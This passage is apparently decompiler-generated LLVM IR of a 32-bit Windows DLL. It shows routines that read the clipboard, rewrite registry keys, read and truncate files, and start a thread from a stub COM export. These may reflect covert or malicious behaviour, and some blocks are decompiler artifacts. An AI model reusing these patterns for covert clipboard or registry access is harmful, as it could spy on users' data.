  %46 = call i32 @"@AStrCmp"(), !insn.addr !1442
  %47 = call i32 @function_405ed8(), !insn.addr !1443
  %48 = add i32 %esp.1.lcssa.reload, -20, !insn.addr !1444
  %49 = inttoptr i32 %48 to i32*, !insn.addr !1444
  store i32 %arg1, i32* %49, align 4, !insn.addr !1444
  %50 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4, !insn.addr !1445
  %51 = ptrtoint i32 (i32, i32, i32)* %50 to i32, !insn.addr !1445
  %52 = add i32 %esp.1.lcssa.reload, -24, !insn.addr !1446
  %53 = inttoptr i32 %52 to i32*, !insn.addr !1446
  store i32 %51, i32* %53, align 4, !insn.addr !1446
  call void @FreeLibraryAndExitThread(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32)), !insn.addr !1447
  unreachable, !insn.addr !1447

dec_label_pc_40659e:                              ; preds = %dec_label_pc_4064a0
  %54 = ptrtoint i32* %2 to i32, !insn.addr !1413
  ret i32 %54, !insn.addr !1448
}

define i32 @function_4065a5(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_4065a5:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_16 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_16, align 4
  %2 = trunc i32 %1 to i8
  %3 = mul i8 %2, 2, !insn.addr !1449
  %4 = inttoptr i32 %1 to i8*, !insn.addr !1449
  store i8 %3, i8* %4, align 1, !insn.addr !1449
  %5 = add i32 %1, 114, !insn.addr !1450
  %6 = inttoptr i32 %5 to i8*, !insn.addr !1450
  %7 = load i8, i8* %6, align 1, !insn.addr !1450
  %8 = udiv i32 %0, 256, !insn.addr !1450
  %9 = trunc i32 %8 to i8, !insn.addr !1450
  %10 = add i8 %7, %9, !insn.addr !1450
  store i8 %10, i8* %6, align 1, !insn.addr !1450
  %11 = add i32 %1, 224, !insn.addr !1451
  %12 = and i32 %11, 255, !insn.addr !1451
  %13 = and i32 %1, -256, !insn.addr !1451
  %14 = or i32 %12, %13, !insn.addr !1451
  %15 = add i32 %14, 105, !insn.addr !1452
  %16 = inttoptr i32 %15 to i8*, !insn.addr !1452
  %17 = load i8, i8* %16, align 1, !insn.addr !1452
  %18 = and i8 %17, %9, !insn.addr !1452
  store i8 %18, i8* %16, align 1, !insn.addr !1452
  %19 = trunc i32 %arg4 to i16, !insn.addr !1453
  %20 = inttoptr i32 %arg7 to i8*, !insn.addr !1453
  %21 = load i8, i8* %20, align 1, !insn.addr !1453
  call void @__asm_outsb(i16 %19, i8 %21), !insn.addr !1453
  %22 = add i32 %arg6, 105, !insn.addr !1454
  %23 = and i32 %22, 65535
  %24 = inttoptr i32 %23 to i8*, !insn.addr !1454
  %25 = load i8, i8* %24, align 1, !insn.addr !1454
  %26 = udiv i32 %arg3, 256, !insn.addr !1454
  %27 = trunc i32 %26 to i8, !insn.addr !1454
  %28 = and i8 %25, %27, !insn.addr !1454
  store i8 %28, i8* %24, align 1, !insn.addr !1454
  %29 = mul i32 %arg6, 2, !insn.addr !1455
  %30 = add i32 %arg3, 115, !insn.addr !1455
  %31 = add i32 %30, %29, !insn.addr !1455
  %32 = inttoptr i32 %31 to i8*, !insn.addr !1455
  %33 = load i8, i8* %32, align 1, !insn.addr !1455
  %34 = trunc i32 %arg3 to i8, !insn.addr !1455
  %35 = add i8 %33, %34, !insn.addr !1455
  %36 = icmp eq i8 %35, 0, !insn.addr !1455
  store i8 %35, i8* %32, align 1, !insn.addr !1455
  br i1 %36, label %dec_label_pc_4065ff, label %dec_label_pc_4065bd, !insn.addr !1456

dec_label_pc_4065bd:                              ; preds = %dec_label_pc_4065a5
  %37 = inttoptr i32 %arg7 to i32*, !insn.addr !1457
  %38 = load i32, i32* %37, align 4, !insn.addr !1457
  call void @__asm_outsd(i16 %19, i32 %38), !insn.addr !1457
  %39 = add i32 %arg2, 224, !insn.addr !1458
  %40 = and i32 %39, 255, !insn.addr !1458
  %41 = and i32 %arg2, -256, !insn.addr !1458
  %42 = or i32 %40, %41, !insn.addr !1458
  %43 = add i32 %arg3, 105, !insn.addr !1459
  %44 = inttoptr i32 %43 to i8*, !insn.addr !1459
  %45 = load i8, i8* %44, align 1, !insn.addr !1459
  %46 = udiv i32 %arg2, 256, !insn.addr !1459
  %47 = trunc i32 %46 to i8, !insn.addr !1459
  %48 = and i8 %45, %47, !insn.addr !1459
  store i8 %48, i8* %44, align 1, !insn.addr !1459
  %49 = add i32 %arg7, 105, !insn.addr !1460
  %50 = inttoptr i32 %49 to i8*, !insn.addr !1460
  %51 = load i8, i8* %50, align 1, !insn.addr !1460
  %52 = and i8 %51, %27, !insn.addr !1460
  store i8 %52, i8* %50, align 1, !insn.addr !1460
  %53 = inttoptr i32 %42 to i8*, !insn.addr !1461
  %54 = load i8, i8* %53, align 1, !insn.addr !1461
  %55 = trunc i32 %39 to i8, !insn.addr !1461
  %factor = mul i8 %55, 2
  %56 = add i8 %54, %factor, !insn.addr !1462
  store i8 %56, i8* %53, align 1, !insn.addr !1462
  %57 = inttoptr i32 %arg3 to i32*, !insn.addr !1463
  %58 = load i32, i32* %57, align 4, !insn.addr !1463
  %59 = add i32 %58, %arg7, !insn.addr !1463
  store i32 %59, i32* %57, align 4, !insn.addr !1463
  %60 = load i8, i8* %53, align 1, !insn.addr !1464
  %61 = add i8 %60, %55, !insn.addr !1464
  store i8 %61, i8* %53, align 1, !insn.addr !1464
  %62 = call i32 @__readfsdword(i32 0), !insn.addr !1465
  store i32 %62, i32* %stack_var_16, align 4, !insn.addr !1465
  %63 = ptrtoint i32* %stack_var_16 to i32, !insn.addr !1465
  call void @__writefsdword(i32 0, i32 %63), !insn.addr !1466
  %64 = load i32, i32* @global_var_4096d4, align 4, !insn.addr !1467
  %65 = add i32 %64, 1, !insn.addr !1467
  store i32 %65, i32* @global_var_4096d4, align 4, !insn.addr !1467
  %66 = load i32, i32* %stack_var_16, align 4, !insn.addr !1468
  call void @__writefsdword(i32 0, i32 %66), !insn.addr !1469
  ret i32 0, !insn.addr !1470

dec_label_pc_4065ff:                              ; preds = %dec_label_pc_4065a5
  ret i32 %arg2, !insn.addr !1471
}

define i32 @function_406604() local_unnamed_addr {
dec_label_pc_406604:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096d4, align 4, !insn.addr !1472
  %2 = add i32 %1, -1, !insn.addr !1472
  store i32 %2, i32* @global_var_4096d4, align 4, !insn.addr !1472
  ret i32 %0, !insn.addr !1473
}

define i32 @function_40660c() local_unnamed_addr {
dec_label_pc_40660c:
  %eax.0.reg2mem = alloca i32, !insn.addr !1474
  %stack_var_-132 = alloca i8*, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %0 = call i32 @"@LStrAsg"(), !insn.addr !1475
  store i32 0, i32* %stack_var_-116, align 4, !insn.addr !1476
  store i32 0, i32* %stack_var_-128, align 4, !insn.addr !1477
  store i8* getelementptr inbounds ([27 x i8], [27 x i8]* @global_var_406698, i32 0, i32 0), i8** %stack_var_-132, align 4, !insn.addr !1478
  %1 = call i32 @function_40438c(i32 0, i32* nonnull %stack_var_-116, i32 1, i32 0, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @global_var_406698, i32 0, i32 0), i32 -2147483647), !insn.addr !1479
  %2 = icmp eq i32 %1, 0, !insn.addr !1480
  %3 = icmp eq i1 %2, false, !insn.addr !1481
  store i32 %1, i32* %eax.0.reg2mem, !insn.addr !1481
  br i1 %3, label %dec_label_pc_406686, label %dec_label_pc_406641, !insn.addr !1481

dec_label_pc_406641:                              ; preds = %dec_label_pc_40660c
  store i8* inttoptr (i32 101 to i8*), i8** %stack_var_-132, align 4, !insn.addr !1482
  %4 = bitcast i8** %stack_var_-132 to i32*, !insn.addr !1483
  %5 = call i32 @function_404394(i32 101, i32* nonnull %4, i32* nonnull %stack_var_-128, i32* nonnull @global_var_40810c, i32 0, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_4066b4, i32 0, i32 0), i32 -2147483647), !insn.addr !1483
  %6 = icmp eq i32 %5, 0, !insn.addr !1484
  %7 = icmp eq i1 %6, false, !insn.addr !1485
  br i1 %7, label %dec_label_pc_40667d, label %dec_label_pc_40666d, !insn.addr !1485

dec_label_pc_40666d:                              ; preds = %dec_label_pc_406641
  %8 = call i32 @"@LStrFromArray"(), !insn.addr !1486
  br label %dec_label_pc_40667d, !insn.addr !1486

dec_label_pc_40667d:                              ; preds = %dec_label_pc_40666d, %dec_label_pc_406641
  %9 = call i32 @function_404374(i32 -2147483647), !insn.addr !1487
  store i32 %9, i32* %eax.0.reg2mem, !insn.addr !1487
  br label %dec_label_pc_406686, !insn.addr !1487

dec_label_pc_406686:                              ; preds = %dec_label_pc_40667d, %dec_label_pc_40660c
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !1488
}

define i32 @function_4066c0() local_unnamed_addr {
dec_label_pc_4066c0:
  %stack_var_-28 = alloca i32, align 4
  %0 = call i32 @function_4036b8(), !insn.addr !1489
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !1490
  store i32 %1, i32* %stack_var_-28, align 4, !insn.addr !1490
  %2 = ptrtoint i32* %stack_var_-28 to i32, !insn.addr !1490
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !1491
  %3 = call i32 @RegDeleteKeyA(i32* bitcast ([27 x i8]* @global_var_406770 to i32*), i8* inttoptr (i32 -2147483647 to i8*)), !insn.addr !1492
  %4 = call i32 @RegCreateKeyExA(i32* null, i8* inttoptr (i32 1 to i8*), i32 ptrtoint (i32* @0 to i32), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32** bitcast (i32* @0 to i32**), i32* nonnull @0), !insn.addr !1493
  %5 = call i32 @function_4034c8(), !insn.addr !1494
  %6 = call i32 @function_4036c8(), !insn.addr !1495
  %7 = inttoptr i32 %6 to i32*, !insn.addr !1496
  %8 = call i32 @RegSetValueExA(i32* %7, i8* inttoptr (i32 1 to i8*), i32 0, i32 ptrtoint ([10 x i8]* @global_var_40678c to i32), i8* null, i32 ptrtoint (i32* @0 to i32)), !insn.addr !1496
  %9 = call i32 @function_404374(i32 0), !insn.addr !1497
  call void @__writefsdword(i32 0, i32 0), !insn.addr !1498
  %10 = call i32 @"@LStrClr"(), !insn.addr !1499
  ret i32 %10, !insn.addr !1500
}

define i32 @function_406762() local_unnamed_addr {
dec_label_pc_406762:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1501
  ret i32 %0, !insn.addr !1501
}

define i32 @function_406767() local_unnamed_addr {
dec_label_pc_406767:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1502
}

define i32 @function_406769() local_unnamed_addr {
dec_label_pc_406769:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1503
}

define i32 @function_406798() local_unnamed_addr {
dec_label_pc_406798:
  %eax.0.reg2mem = alloca i32, !insn.addr !1504
  %0 = call i32 @"@LStrClr"(), !insn.addr !1505
  %1 = call i1 @OpenClipboard(i32* null), !insn.addr !1506
  %2 = icmp eq i1 %1, false, !insn.addr !1507
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !1508
  br i1 %2, label %dec_label_pc_4067e2, label %dec_label_pc_4067b5, !insn.addr !1508

dec_label_pc_4067b5:                              ; preds = %dec_label_pc_406798
  %3 = call i32* @GetClipboardData(i32 1), !insn.addr !1509
  %4 = icmp eq i32* %3, null, !insn.addr !1510
  br i1 %4, label %dec_label_pc_4067dd, label %dec_label_pc_4067c2, !insn.addr !1511

dec_label_pc_4067c2:                              ; preds = %dec_label_pc_4067b5
  %5 = call i32* @GlobalLock(i32* nonnull %3), !insn.addr !1512
  %6 = icmp eq i32* %5, null, !insn.addr !1513
  br i1 %6, label %dec_label_pc_4067dd, label %dec_label_pc_4067ce, !insn.addr !1514

dec_label_pc_4067ce:                              ; preds = %dec_label_pc_4067c2
  %7 = call i32 @"@LStrFromPChar"(), !insn.addr !1515
  %8 = call i1 @GlobalUnlock(i32* nonnull %3), !insn.addr !1516
  br label %dec_label_pc_4067dd, !insn.addr !1516

dec_label_pc_4067dd:                              ; preds = %dec_label_pc_4067ce, %dec_label_pc_4067c2, %dec_label_pc_4067b5
  %9 = call i1 @CloseClipboard(), !insn.addr !1517
  %10 = sext i1 %9 to i32, !insn.addr !1517
  store i32 %10, i32* %eax.0.reg2mem, !insn.addr !1517
  br label %dec_label_pc_4067e2, !insn.addr !1517

dec_label_pc_4067e2:                              ; preds = %dec_label_pc_4067dd, %dec_label_pc_406798
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !1518
}

define i32 @DllGetClassObject(i32 %arg1) local_unnamed_addr {
dec_label_pc_4067e8:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i8*, align 4
  %2 = inttoptr i32 %1 to i8*, !insn.addr !1519
  store i8* %2, i8** %stack_var_-8, align 4, !insn.addr !1519
  %3 = load i32*, i32** @global_var_40813c, align 4
  %4 = icmp eq i32* %3, null, !insn.addr !1520
  %5 = icmp eq i1 %4, false, !insn.addr !1521
  %6 = icmp eq i1 %5, false, !insn.addr !1522
  br i1 %6, label %dec_label_pc_406824, label %dec_label_pc_4067fb, !insn.addr !1522

dec_label_pc_4067fb:                              ; preds = %dec_label_pc_4067e8
  %7 = inttoptr i32 %0 to i8*, !insn.addr !1523
  %8 = call i32* @FindWindowA(i8* %7, i8* %2), !insn.addr !1524
  %9 = icmp eq i32* %8, null, !insn.addr !1525
  %10 = icmp eq i1 %9, false, !insn.addr !1526
  br i1 %10, label %dec_label_pc_406824, label %dec_label_pc_40680e, !insn.addr !1526

dec_label_pc_40680e:                              ; preds = %dec_label_pc_4067fb
  %11 = bitcast i8** %stack_var_-8 to %_SECURITY_ATTRIBUTES*
  %12 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %11, i32 0, i32 (i32*)* inttoptr (i32 66 to i32 (i32*)*), i32* inttoptr (i32 4220064 to i32*), i32 0, i32* null), !insn.addr !1527
  br label %dec_label_pc_406824, !insn.addr !1527

dec_label_pc_406824:                              ; preds = %dec_label_pc_40680e, %dec_label_pc_4067fb, %dec_label_pc_4067e8
  %13 = inttoptr i32 %arg1 to i32*, !insn.addr !1528
  store i32 0, i32* %13, align 4, !insn.addr !1528
  ret i32 -2147221231, !insn.addr !1529
}

define i32 @DllCanUnloadNow() local_unnamed_addr {
dec_label_pc_406850:
  ret i32 0, !insn.addr !1530
}

define i32 @DllRegisterServer() local_unnamed_addr {
dec_label_pc_406854:
  ret i32 0, !insn.addr !1531
}

define i32 @DllUnregisterServer() local_unnamed_addr {
dec_label_pc_406858:
  ret i32 0, !insn.addr !1532
}

define i32 @function_40685c() local_unnamed_addr {
dec_label_pc_40685c:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1533
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1533
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1533
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1534
  %2 = load i32, i32* @global_var_4096d8, align 4, !insn.addr !1535
  %3 = add i32 %2, 1, !insn.addr !1535
  store i32 %3, i32* @global_var_4096d8, align 4, !insn.addr !1535
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1536
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1537
  ret i32 0, !insn.addr !1538
}

define i32 @function_406881() local_unnamed_addr {
dec_label_pc_406881:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1539
  ret i32 %0, !insn.addr !1539
}

define i32 @function_406886() local_unnamed_addr {
dec_label_pc_406886:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1540
}

define i32 @function_406888(i32 %arg1) local_unnamed_addr {
dec_label_pc_406888:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1541
}

define i32 @function_40688c() local_unnamed_addr {
dec_label_pc_40688c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096d8, align 4, !insn.addr !1542
  %2 = add i32 %1, -1, !insn.addr !1542
  store i32 %2, i32* @global_var_4096d8, align 4, !insn.addr !1542
  ret i32 %0, !insn.addr !1543
}

define i32 @function_4068dc() local_unnamed_addr {
dec_label_pc_4068dc:
  %esp.1.reg2mem = alloca i32, !insn.addr !1544
  %stack_var_-116 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-84 = alloca i8*, align 4
  %stack_var_-56 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1545
  store i32 %0, i32* %stack_var_-56, align 4, !insn.addr !1545
  %1 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1545
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1546
  %2 = call i32 @"@LStrCat3"(), !insn.addr !1547
  %3 = call i32 @function_4036c8(), !insn.addr !1548
  %4 = inttoptr i32 %3 to i8*, !insn.addr !1549
  store i8* %4, i8** %stack_var_-84, align 4, !insn.addr !1549
  %5 = ptrtoint i8** %stack_var_-84 to i32, !insn.addr !1549
  %6 = call i32* @CreateFileA(i8* %4, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1550
  %7 = icmp eq i32* %6, inttoptr (i32 -1 to i32*), !insn.addr !1551
  store i32 %5, i32* %esp.1.reg2mem, !insn.addr !1552
  br i1 %7, label %dec_label_pc_406a7b, label %dec_label_pc_406946, !insn.addr !1552

dec_label_pc_406946:                              ; preds = %dec_label_pc_4068dc
  %8 = ptrtoint i32* %6 to i32, !insn.addr !1550
  store i32 %8, i32* %stack_var_-92, align 4, !insn.addr !1553
  %9 = ptrtoint i32* %stack_var_-92 to i32, !insn.addr !1553
  %10 = call i32 @GetFileSize(i32* null, i32* %6), !insn.addr !1554
  %11 = add i32 %10, 1
  %12 = icmp ult i32 %11, 2
  store i32 %9, i32* %esp.1.reg2mem, !insn.addr !1555
  br i1 %12, label %dec_label_pc_406a7b, label %dec_label_pc_406962, !insn.addr !1555

dec_label_pc_406962:                              ; preds = %dec_label_pc_406946
  %13 = call i32 @"@LStrSetLength"(), !insn.addr !1556
  %14 = call i32 @function_403720(), !insn.addr !1557
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1558
  %16 = call i1 @ReadFile(i32* %15, i32* %6, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0, %_OVERLAPPED* bitcast (i32* @0 to %_OVERLAPPED*)), !insn.addr !1558
  store i32 %8, i32* %stack_var_-116, align 4, !insn.addr !1559
  %17 = ptrtoint i32* %stack_var_-116 to i32, !insn.addr !1559
  %18 = call i1 @CloseHandle(i32* %6), !insn.addr !1560
  %19 = call i32 @function_4046d4(), !insn.addr !1561
  store i32 %17, i32* %esp.1.reg2mem
  br label %dec_label_pc_406a7b

dec_label_pc_406a7b:                              ; preds = %dec_label_pc_406962, %dec_label_pc_406946, %dec_label_pc_4068dc
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %20 = inttoptr i32 %esp.1.reload to i32*, !insn.addr !1562
  %21 = load i32, i32* %20, align 4, !insn.addr !1562
  call void @__writefsdword(i32 0, i32 %21), !insn.addr !1563
  %22 = add i32 %esp.1.reload, 8, !insn.addr !1564
  %23 = inttoptr i32 %22 to i32*, !insn.addr !1564
  store i32 4221597, i32* %23, align 4, !insn.addr !1564
  %24 = call i32 @"@LStrArrayClr"(), !insn.addr !1565
  ret i32 %24, !insn.addr !1566
}

define i32 @function_406a96() local_unnamed_addr {
dec_label_pc_406a96:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1567
  ret i32 %0, !insn.addr !1567
}

define i32 @function_406a9b() local_unnamed_addr {
dec_label_pc_406a9b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1568
}

define i32 @function_406a9d(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406a9d:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !1569
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1569
  %3 = load i32, i32* %2, align 4, !insn.addr !1569
  ret i32 %3, !insn.addr !1570
}

define i32 @function_406ad4() local_unnamed_addr {
dec_label_pc_406ad4:
  %esp.2.reg2mem = alloca i32, !insn.addr !1571
  %esp.1.reg2mem = alloca i32, !insn.addr !1571
  %esi.0.reg2mem = alloca i32, !insn.addr !1571
  %esp.0.reg2mem = alloca i32, !insn.addr !1571
  %ebx.0.reg2mem = alloca i32, !insn.addr !1571
  %stack_var_-68 = alloca i8*, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 0, i32* %stack_var_-8, align 4, !insn.addr !1572
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1573
  store i32 %0, i32* %stack_var_-40, align 4, !insn.addr !1573
  %1 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1573
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1574
  %2 = call i32 @function_403c88(), !insn.addr !1575
  %3 = icmp slt i32 %2, 1
  store i32 %1, i32* %esp.2.reg2mem, !insn.addr !1576
  br i1 %3, label %dec_label_pc_406bbd, label %dec_label_pc_406b02, !insn.addr !1576

dec_label_pc_406b02:                              ; preds = %dec_label_pc_406ad4
  %4 = call i32 @"@LStrCat3"(), !insn.addr !1577
  %5 = call i32 @function_4036c8(), !insn.addr !1578
  %6 = inttoptr i32 %5 to i8*, !insn.addr !1579
  store i8* %6, i8** %stack_var_-68, align 4, !insn.addr !1579
  %7 = ptrtoint i8** %stack_var_-68 to i32, !insn.addr !1579
  %8 = call i32* @CreateFileA(i8* %6, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1580
  %9 = icmp eq i32* %8, inttoptr (i32 -1 to i32*), !insn.addr !1581
  store i32 %7, i32* %esp.2.reg2mem, !insn.addr !1582
  br i1 %9, label %dec_label_pc_406bbd, label %dec_label_pc_406b3e, !insn.addr !1582

dec_label_pc_406b3e:                              ; preds = %dec_label_pc_406b02
  %10 = call i32 @"@LStrClr"(), !insn.addr !1583
  %11 = call i32 @function_403c90(), !insn.addr !1584
  %12 = icmp slt i32 %11, 0, !insn.addr !1585
  store i32 %7, i32* %esp.1.reg2mem, !insn.addr !1586
  br i1 %12, label %dec_label_pc_406b88, label %dec_label_pc_406b56, !insn.addr !1586

dec_label_pc_406b56:                              ; preds = %dec_label_pc_406b3e
  %13 = add i32 %11, 1, !insn.addr !1587
  store i32 0, i32* %ebx.0.reg2mem, !insn.addr !1588
  store i32 %7, i32* %esp.0.reg2mem, !insn.addr !1588
  store i32 %13, i32* %esi.0.reg2mem, !insn.addr !1588
  br label %dec_label_pc_406b59, !insn.addr !1588

dec_label_pc_406b59:                              ; preds = %dec_label_pc_406b59, %dec_label_pc_406b56
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %14 = add i32 %esp.0.reload, -4, !insn.addr !1589
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1589
  store i32 0, i32* %15, align 4, !insn.addr !1589
  %16 = load i32, i32* @global_var_4096e0, align 4, !insn.addr !1590
  %17 = mul i32 %ebx.0.reload, 8, !insn.addr !1591
  %18 = add i32 %16, %17, !insn.addr !1591
  %19 = inttoptr i32 %18 to i32*, !insn.addr !1591
  %20 = load i32, i32* %19, align 4, !insn.addr !1591
  %21 = add i32 %esp.0.reload, -8, !insn.addr !1591
  %22 = inttoptr i32 %21 to i32*, !insn.addr !1591
  store i32 %20, i32* %22, align 4, !insn.addr !1591
  %23 = add i32 %esp.0.reload, -12, !insn.addr !1592
  %24 = inttoptr i32 %23 to i32*, !insn.addr !1592
  store i32 ptrtoint (i32* @global_var_406c04 to i32), i32* %24, align 4, !insn.addr !1592
  %25 = load i32, i32* @global_var_4096e0, align 4, !insn.addr !1593
  %26 = or i32 %17, 4, !insn.addr !1594
  %27 = add i32 %25, %26, !insn.addr !1594
  %28 = inttoptr i32 %27 to i32*, !insn.addr !1594
  %29 = load i32, i32* %28, align 4, !insn.addr !1594
  %30 = add i32 %esp.0.reload, -16, !insn.addr !1594
  %31 = inttoptr i32 %30 to i32*, !insn.addr !1594
  store i32 %29, i32* %31, align 4, !insn.addr !1594
  %32 = add i32 %esp.0.reload, -20, !insn.addr !1595
  %33 = inttoptr i32 %32 to i32*, !insn.addr !1595
  store i32 ptrtoint ([3 x i8]* @global_var_406c10 to i32), i32* %33, align 4, !insn.addr !1595
  %34 = call i32 @"@LStrCatN"(), !insn.addr !1596
  %35 = add i32 %ebx.0.reload, 1, !insn.addr !1597
  %36 = add i32 %esi.0.reload, -1, !insn.addr !1598
  %37 = icmp eq i32 %36, 0, !insn.addr !1598
  %38 = icmp eq i1 %37, false, !insn.addr !1599
  store i32 %35, i32* %ebx.0.reg2mem, !insn.addr !1599
  store i32 %32, i32* %esp.0.reg2mem, !insn.addr !1599
  store i32 %36, i32* %esi.0.reg2mem, !insn.addr !1599
  store i32 %32, i32* %esp.1.reg2mem, !insn.addr !1599
  br i1 %38, label %dec_label_pc_406b59, label %dec_label_pc_406b88, !insn.addr !1599

dec_label_pc_406b88:                              ; preds = %dec_label_pc_406b59, %dec_label_pc_406b3e
  %39 = ptrtoint i32* %8 to i32, !insn.addr !1580
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %40 = call i32 @function_4046d4(), !insn.addr !1600
  %41 = add i32 %esp.1.reload, -4, !insn.addr !1601
  %42 = inttoptr i32 %41 to i32*, !insn.addr !1601
  store i32 0, i32* %42, align 4, !insn.addr !1601
  %43 = add i32 %esp.1.reload, -8, !insn.addr !1602
  %44 = inttoptr i32 %43 to i32*, !insn.addr !1602
  %45 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !1602
  store i32 %45, i32* %44, align 4, !insn.addr !1602
  %46 = call i32 @function_4034c8(), !insn.addr !1603
  %47 = add i32 %esp.1.reload, -12, !insn.addr !1604
  %48 = inttoptr i32 %47 to i32*, !insn.addr !1604
  store i32 %46, i32* %48, align 4, !insn.addr !1604
  %49 = call i32 @function_403720(), !insn.addr !1605
  %50 = add i32 %esp.1.reload, -16, !insn.addr !1606
  %51 = inttoptr i32 %50 to i32*, !insn.addr !1606
  store i32 %49, i32* %51, align 4, !insn.addr !1606
  %52 = add i32 %esp.1.reload, -20, !insn.addr !1607
  %53 = inttoptr i32 %52 to i32*, !insn.addr !1607
  store i32 %39, i32* %53, align 4, !insn.addr !1607
  %54 = call i32 @function_40446c(), !insn.addr !1608
  %55 = add i32 %esp.1.reload, -24, !insn.addr !1609
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1609
  store i32 %39, i32* %56, align 4, !insn.addr !1609
  %57 = call i1 @SetEndOfFile(i32* nonnull @0), !insn.addr !1610
  %58 = add i32 %esp.1.reload, -28, !insn.addr !1611
  %59 = inttoptr i32 %58 to i32*, !insn.addr !1611
  store i32 %39, i32* %59, align 4, !insn.addr !1611
  %60 = call i1 @CloseHandle(i32* nonnull @0), !insn.addr !1612
  store i32 %58, i32* %esp.2.reg2mem, !insn.addr !1613
  br label %dec_label_pc_406bbd, !insn.addr !1613

dec_label_pc_406bbd:                              ; preds = %dec_label_pc_406b88, %dec_label_pc_406b02, %dec_label_pc_406ad4
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %61 = inttoptr i32 %esp.2.reload to i32*, !insn.addr !1614
  %62 = load i32, i32* %61, align 4, !insn.addr !1614
  call void @__writefsdword(i32 0, i32 %62), !insn.addr !1615
  %63 = add i32 %esp.2.reload, 8, !insn.addr !1616
  %64 = inttoptr i32 %63 to i32*, !insn.addr !1616
  store i32 4221919, i32* %64, align 4, !insn.addr !1616
  %65 = call i32 @"@LStrArrayClr"(), !insn.addr !1617
  ret i32 %65, !insn.addr !1618
}

define i32 @function_406bd8() local_unnamed_addr {
dec_label_pc_406bd8:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1619
  ret i32 %0, !insn.addr !1619
}

define i32 @function_406bdd() local_unnamed_addr {
dec_label_pc_406bdd:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1620
}

define i32 @function_406bdf(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_406bdf:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1621
}

define i32 @function_406c14() local_unnamed_addr {
dec_label_pc_406c14:
  %stack_var_-40 = alloca i32, align 4
  %0 = call i32 @function_4036b8(), !insn.addr !1622
  %1 = call i32 @function_4036b8(), !insn.addr !1623
